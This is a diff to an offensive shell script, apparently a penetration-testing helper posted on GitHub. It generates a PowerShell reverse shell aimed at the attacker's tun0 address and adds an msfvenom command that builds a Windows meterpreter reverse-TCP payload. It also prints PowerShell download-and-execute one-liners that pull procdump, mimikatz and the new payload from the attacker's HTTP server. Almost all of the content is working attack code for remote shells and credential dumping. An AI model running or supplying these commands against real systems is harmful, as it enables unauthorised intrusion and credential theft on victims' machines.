@@ -6,6 +6,23 @@
 #                BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)
 # -------------------------------------------------------------------------------------
 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub                                                               
+# Version : 2.0                                                                
+# Details : Create two universal system files - payload.exe and reverseshell.ps1
+# Modified: N/A                                                               
+# -------------------------------------------------------------------------------------
+
+ifconfig tun0 | grep 'inet ' | awk '{print $2}' | sed 's/addr://' > file.txt
+cp template.txt reverseshell.ps1
+filename="file.txt"
+while read line
+  do 
+  echo "Invoke-PowerShellTcp -Reverse -IPAddress $line -Port 9001" >> reverseshell.ps1
+  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$line LPORT=6666 --platform windows -f exe -o winpayload.exe
+done < $filename
+mv ./reverseshell.ps1 ./PowerShell/reverseshell.ps1
+
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
@@ -28,20 +45,9 @@ echo "\n"
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
 # Version : 2.0                                                                
-# Details : Start the HTTP Server.
+# Details : Start the HTTP Serever.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
-
-ifconfig tun0 | grep 'inet ' | awk '{print $2}' | sed 's/addr://' > file.txt
-cp template.txt reverseshell.ps1
-
-filename="file.txt"
-while read line
-  do 
-  echo "Invoke-PowerShellTcp -Reverse -IPAddress $line -Port 9001" >> reverseshell.ps1
-done < $filename
-
-mv ./reverseshell.ps1 ./PowerShell/reverseshell.ps1
 
 echo "Instructions: START PowerShell -ExecutionPolicy Unrestricted -NoProfile\n"
 
@@ -65,6 +71,7 @@ while read line
   echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/Procdump/procdump64.exe')\"" 
   echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/MimiKatz/mimikatz64.exe')\"" 
   echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/MimiKatz/mimikatz32.exe')\"" 
+  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/winpayload.exe')\""
 done < $filename
 
 echo ""
